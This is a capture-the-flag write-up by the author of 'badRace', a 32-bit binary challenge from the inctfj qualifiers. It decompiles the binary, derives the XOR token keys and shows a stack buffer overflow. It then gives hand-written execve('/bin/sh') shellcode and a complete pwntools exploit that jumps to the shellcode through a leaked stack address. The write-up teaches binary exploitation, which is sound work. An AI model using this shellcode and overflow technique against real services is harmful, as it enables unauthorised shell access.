# badRace

Challenge Points:

No of Solves:

Challenge Author: [d1g174l_f0r7r355](https://twitter.com/BhaskaraShravya)

This was one of the medium challenges I made for inctfj qualifiers. It is based on ret2shellcode. 

## Preliminary checks: 
It is a 32 bit, dynamically linked, non-stripped binary. 
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda$ 

```
For this challenge all protections are disabled and making it easier for us to pwn. However one thing that piques our interest is `NX` bit being disabled. As a result, we can inject a shellcode and obtain a shell. No source code was given for this challenge, therefore we will make use of ida/ ghidra to decompile. 

## Ghidra decompilation and analysis: 

### main(): 
```
void main(void)

{
  char choice;
  undefined4 car;
  undefined *puStack16;
  
  puStack16 = &stack0x00000004;
  car = 0;
  initialize();
  puts("Wecome to my car race!");
  do {
    while( true ) {
      while( true ) {
        printf("\n1. Buy car\n2. Race car\nChoice: ");
        __isoc99_scanf(&DAT_0804a0cd,&choice);
        getchar();
        if (choice != '1') break;
        car = buy_car();
      }
      if (choice == '2') break;
      puts("Invalid choice!");
    }
    race_car(car);
  } while( true );
}
```
In main, we see that it provides us with two choices, to `Buy car` or to `Race car`. Once `buy_car` is called, it stores the value returned into variable `car` which is passed as an argument to `race_car`. 

### buy_car():
```
undefined4 buy_car(void)

{
  undefined4 car;
  undefined car2 [32];
  undefined car1 [32];
  char choice [5];
  
  puts("\nWhat car do you wish to buy?");
  printf("1. Ace of Spades\n2. Nightshade\nChoice: ");
  __isoc99_scanf(&DAT_0804a0cd,choice);
  getchar();
  if (choice[0] == '1') {
    printf("You may find your car at this location: %p\n",car1);
    car = 1;
  }
  else {
    if (choice[0] != '2') {
      puts("Invalid input!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    printf("You may find your car at this location: %p\n",car2);
    car = 2;
  }
  return car;
}
```
In this function, we are again provided with two choices as to which car we need to select! Accordingly a leak is provided. Since all protections are disabled and in order to inject shellcode, we may find the leak useful. 

### race_car():
```
void race_car(int param_1)

{
  char race;
  undefined4 access_code;
  
  access_code = 0;
  puts("\nWhat kind of race would you choose?");
  printf("\n1. Open-wheel racing\n2. Touring car racing\nChoice: ");
  __isoc99_scanf(&DAT_0804a0cd,&car);
  getchar();
  if (param_1 == 0) {
    puts("Choose a car first");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (race == '1') {
    if (param_1 == 1) {
      access_code = 0xdeadbeef;
    }
    else {
      access_code = 0xd0d0face;
    }
  }
  else {
    if (race != '2') {
      puts("Invalid choice!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (param_1 == 1) {
      access_code = 0xc0cac0de;
    }
    else {
      access_code = 0xcafebabe;
    }
  }
  begin_race(access_code);
  return;
}
```
In this function, firstly we are again given a choice as to what race we want to select. However if no car has been selected, it will simply ask you to select a car first and then exits. 
	- If car choice is '1' and race choice is also '1', our access code is `0xdeadbeef`.
	- If car choice is '2' and race choice is '1', our access code is `0xd0d0face`.
	- If car choice is '1' and race choice is '2', our access code is `0xc0cac0de`.
	- If car choice is '2' and race choice is also '2', our access code is `0xcafebabe`.
	
Before returnig, it calls the function `begin_race()` with the `access_code` as an argument. 

### begin_race():
```
undefined4 begin_race(uint param_1)

{
  char navigation [32];
  uint token_key [2];
  
  puts("Give us your access token key: ");
  __isoc99_scanf(&DAT_0804a028,token_key);
  getchar();
  if ((token_key[0] ^ param_1) == 0x1337c0de) {
    puts("\nGive us your navigation commands to win the race!");
    fgets(navigation,0x50,stdin);
  }
  else {
    puts("Access denied!");
  }
  return 0;
}
```
We have seen how `race_car()` calls the function `begin_race()` with the `access_code` passed as an argument! In the function `begin_race()`, you are asked to enter your token key. Thereafter, your token key is xored with param_1 (i.e your access code), and if the result is equal to `0x1337c0de`, it simply asks you to enter the navogation commands. We can also see a buffer overflow while reading navigation commands as it reads `0x50` bytes of input, whereas the size of navigation is only 32 bytes. 
Thus in order to satisfy the check, our token key should be:
	- `3449454129` if our `access code = 0xdeadbeef`. (Since `0xdeadbeef ^ 0x1337c0de = 3449454129`)
	- `3286710800` if our `access code = 0xd0d0face`. (Since `0xd0d0face ^ 0x1337c0de = 3286710800`)
	- `3556573184` if our `access code = 0xc0cac0de`. (Since `0xc0cac0de ^ 0x1337c0de = 3556573184`)
	- `3653859936` if our `access code = 0xcafebabe`. (Since `0xcafebabe ^ 0x1337c0de = 3653859936`)
	
Once we pass the check, we can simply inject shellcode with the help of the given leak. 


## Exploitation:
Now that we have understood the binary, let's begin with the exploitation part! In my exploit I have chosen car '1' and race '2'. Thus my access code is `0xc0cac0de`. You can choose any other car or race, however your token key will be different for each case, depending on your access key. 

The shellcode we wish to inject can either be found online [here](http://shell-storm.org/shellcode/) or one may choose to write the shellcode! For the sake of writeup, below I have explained how you can write your own shellcode! 

### Shellcode:
While writing the shellcode, it is necessary to note which syscall we are going to call. In this case I will be making use of an `execve` shellcode. The arguments to the `execve` shellcode are (shown in terms of registers eax, ebx, ecx and edx):
	- `eax` = syscall number i.e `0xb` for the execve shellcode 32 bit.
	- `ebx` should contain a pointer to the string `/bin/sh`.
	- `ecx` and `edx` must be nulled out. 
	
Thus our shellcode may look something like this:
```python=
shell = 'xor ecx, ecx\n'		# ecx = 0
shell += 'xor edx, edx\n'		# edx = 0
shell += 'push eax\n'
shell += 'push 0x68732f\n'
shell += 'push 0x6e69622f\n'		# the string "/bin/sh" is pushed onto the stack
shell += 'mov ebx, esp\n'		# ebx now points to "/bin/sh"
shell += 'push 0xb\n'			# setting the syscall number into eax.
shell += 'pop eax\n'		
shell += 'int 0x80\n'			# syscall
```

Another factor we haven't looked into is the leak. Once we place our shellcode on the stack, while overflowing, we might have to give the location where our shellcode is present, so that the program can jump to that location and begin executing the shellcode. The leak provided is a stack leak. And the stack size is `0x30` bytes. 
We can find our shellcode in memory like this. 
```
gdb-peda$ x/10i $ebp-0x2c
   0xffa1a1fc:	xor    ecx,ecx
   0xffa1a1fe:	xor    edx,edx
   0xffa1a200:	push   eax
   0xffa1a201:	push   0x68732f
   0xffa1a206:	push   0x6e69622f
   0xffa1a20b:	mov    ebx,esp
   0xffa1a20d:	push   0xb
   0xffa1a20f:	pop    eax
   0xffa1a210:	int    0x80
   0xffa1a212:	popa   
gdb-peda$ 

```
Thus we note that our shellcode is present at location $ebp-0x2c. With the given leak we can find that eip is located 0x13 bytes below the leaked address. 
```
gdb-peda$ x/x $ebp+0x4
0xffa1a22c:	0xffa1a1fc
gdb-peda$ p 0xffa1a23f - 0xffa1a22c
$4 = 0x13
gdb-peda$ 

```
Since eip is 4 bytes above ebp, while giving the buffer we will have subtract the length of our shellcode from `0x30` in order to find the size. 
Thus our payload will look something like this:
```
pay = shell
pay += 'a'*(0x30 - len(shell))
pay += p32(eip-0x30)
```
## Exploit:
```python=
from pwn import *

#p = process('./chall')

p = remote(host, 5005)

#gdb.attach(p)

p.recv()
p.sendline('1')

p.recv()
p.sendline('1')

p.recvuntil('You may find your car at this location: ')
leak = p.recvline()[:-1]
leak = int(leak, 16)
info("leak: %s"%hex(leak))

p.sendline('2')
p.recvuntil('2. Touring car racing\n')
p.sendline('2')

p.recvuntil('Give us your access token key: \n')
p.sendline(str(0x1337c0de ^ 0xc0cac0de))

p.recvuntil('Give us your navigation commands to win the race!\n')

shell = 'xor ecx, ecx\n'
shell += 'xor edx, edx\n'
shell += 'push eax\n'
shell += 'push 0x68732f\n'
shell += 'push 0x6e69622f\n'
shell += 'mov ebx, esp\n'
shell += 'push 0xb\n'
shell += 'pop eax\n'
shell += 'int 0x80\n'

shell = asm(shell)

eip = leak - 0x13
info("eip: %s"%hex(eip))

pay = shell
pay += 'a'*(0x30 - len(shell))
pay += p32(eip-0x30)

p.sendline(pay)

p.interactive()

```

## Flag:
```inctfj{p13c3_0f_sh3ll_1s_4_p13ce_0f_c4k3}```
